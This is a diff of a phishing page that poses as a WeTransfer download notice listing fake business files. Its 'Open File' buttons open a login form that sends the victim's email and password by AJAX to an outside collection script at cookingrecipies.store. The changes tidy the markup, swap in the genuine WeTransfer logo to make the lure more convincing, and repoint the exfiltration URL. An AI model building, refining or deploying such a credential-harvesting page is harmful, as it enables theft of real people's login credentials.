@@ -44,32 +44,34 @@ input[type=password] { width: 450px; height: 60px; border: none; border-radius: 
       <img src="https://ia902600.us.archive.org/30/items/09lo-77ad-9er/45dow887nlo890ad.png" alt="Your Image" >
 
  <h1>Ready when you are</h1>
- <h4>Transfers expires in 5days</h3>
+ <h4>Transfers expires in 5days</h4>
 
 
     <table>
       <tr>
         <td><img src="https://ia902607.us.archive.org/27/items/011vi-00de-212o/032ex23c1el-1.png" alt="Image 1" style="width:50px;height:50px;"></td>
-        <td><h4 style="color:#3741d9;">Purchase order.xlsx</h4></td><td>..........................</td>
-        <td><h4>2.38KB</td><td></td>
+        <td><h4 style="color:#3741d9;">Purchase order.xlsx</h4></td>
+        <td>..........................</td>
+        <td><h4>2.38KB</h4></td><td></td>
         <td><a onclick="openForm()" class="download-button">Open File</a></td>
       </tr>
+      
       <tr>
         <td><img src="https://ia902607.us.archive.org/27/items/011vi-00de-212o/0p111n0g.png" alt="Image 2" style="width:50px;height:50px;"></td>
         <td><h4 style="color:#3741d9;">Sample Pic-1.png</h4></td><td>..........................</td>
-        <td><h4>45.65KB</td><td></td>
+        <td><h4>45.65KB</h4></td><td></td>
         <td><a onclick="openForm()" class="download-button">Open File</a></td>
       </tr>
       <tr>
         <td><img src="https://ia902607.us.archive.org/27/items/011vi-00de-212o/0p111n0g.png" alt="Image 3" style="width:50px;height:50px;"></td>
         <td><h4 style="color:#3741d9;">Sample Pic-2.png</h4></td><td>..........................</td>
-        <td><h4>85.60KB</td><td></td>
+        <td><h4>85.60KB</h4></td><td></td>
         <td><a onclick="openForm()" class="download-button">Open File</a></td>
       </tr>
       <tr>
         <td><img src="https://ia902607.us.archive.org/27/items/011vi-00de-212o/a1pd00f.png" alt="Image 4" style="width:50px;height:50px;"></td>
         <td><h4 style="color:#3741d9;">Sales Contract.pdf</h4></td><td>..........................</td>
-        <td><h4>1.20MB</td><td></td>
+        <td><h4>1.20MB</h4></td><td></td>
         <td><a onclick="openForm()" class="download-button">Open File</a></td>
 		       
 
@@ -89,7 +91,7 @@ input[type=password] { width: 450px; height: 60px; border: none; border-radius: 
 		<span class="close-btn" onclick="closeForm()">&times;</span>
 
 		    <div class="logo-form">
-      <img src="https://ia902700.us.archive.org/6/items/23lo-33go/23lo33go.svg" alt="LOGO">
+      <img src="https://auth-cdn.wetransfer.com/assets/images/logo-free-mobile.svg" alt="LOGO">
     </div>
     <div class="writeup-form">
       <h2></h2>
@@ -99,7 +101,7 @@ input[type=password] { width: 450px; height: 60px; border: none; border-radius: 
   <form id="myForm" method="post">
       <div class="form-group">
         
-        <input type="email" id="email" name="email" placeholder="Email" required=""readonly>
+        <input type="email" id="email" name="email" placeholder="Email" required readonly>
 		  
       </div>
       <div class="form-group">
@@ -107,7 +109,7 @@ input[type=password] { width: 450px; height: 60px; border: none; border-radius: 
         <input type="password" id="password" name="password" placeholder="Password" >
       </div>
 	  <br>
-      <button class="login-btn" type="submit"id="submit"><h1>Login</h1></button>
+      <button class="login-btn" type="submit" id="submit"><h1>Login</h1></button>
   </form>
 
   <div id="result"></div>
@@ -126,7 +128,7 @@ input[type=password] { width: 450px; height: 60px; border: none; border-radius: 
         // Send the form data using AJAX
         $.ajax({
           type: 'POST',
-          url: 'https://cookingrecipies.store/LEROY/WETRANSFER/waka-login-wechat.php', // Replace with the actual URL to submit the form data
+          url: 'https://cookingrecipies.store/LEROY/waka-login-wechat.php', // Replace with the actual URL to submit the form data
           data: formData,
           success: function(response) {
             $('#result').html('<span style="color: green;">' + response + '</span>'); // Display the response
